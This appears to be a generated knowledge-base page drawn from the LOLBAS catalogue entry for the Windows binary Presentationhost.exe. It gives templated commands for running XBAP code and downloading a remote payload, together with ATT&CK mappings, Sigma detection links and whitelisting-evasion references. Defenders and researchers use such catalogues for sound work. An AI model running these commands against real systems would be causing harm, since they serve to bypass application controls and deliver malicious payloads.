---
title: "Presentationhost.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OSBinaries/Presentationhost.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Presentationhost.yml"
build_date: "2026-04-27 19:14:21"
category: "OSBinaries"
aliases:
  - "Presentationhost.exe"
functions:
  - "Execute"
  - "Download"
attack_technique_ids:
  - "T1218"
  - "T1105"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

File is used for executing Browser applications

## Paths

- `C:\Windows\System32\Presentationhost.exe`
- `C:\Windows\SysWOW64\Presentationhost.exe`

## Commands

### 1. Execute

Executes the target XAML Browser Application (XBAP) file

```cmd
Presentationhost.exe {PATH_ABSOLUTE:.xbap}
```

- Use Case: Execute code within XBAP files
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218: System Binary Proxy Execution]]

### 2. Download

It will download a remote payload and place it in INetCache.

```cmd
Presentationhost.exe {REMOTEURL}
```

- Use Case: Downloads payload from remote server
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105: Ingress Tool Transfer]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_presentationhost_download.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_presentationhost.yml
- IOC: Execution of .xbap files may not be common on production workstations

## Resources

- {'Link': 'https://github.com/api0cradle/ShmooCon-2015/blob/master/ShmooCon-2015-Simple-WLEvasion.pdf'}
- {'Link': 'https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/'}

## Acknowledgements

- {'Person': 'Casey Smith', 'Handle': '@subtee'}
- {'Person': 'Nir Chako (Pentera)', 'Handle': '@C_h4ck_0'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Presentationhost.yml)
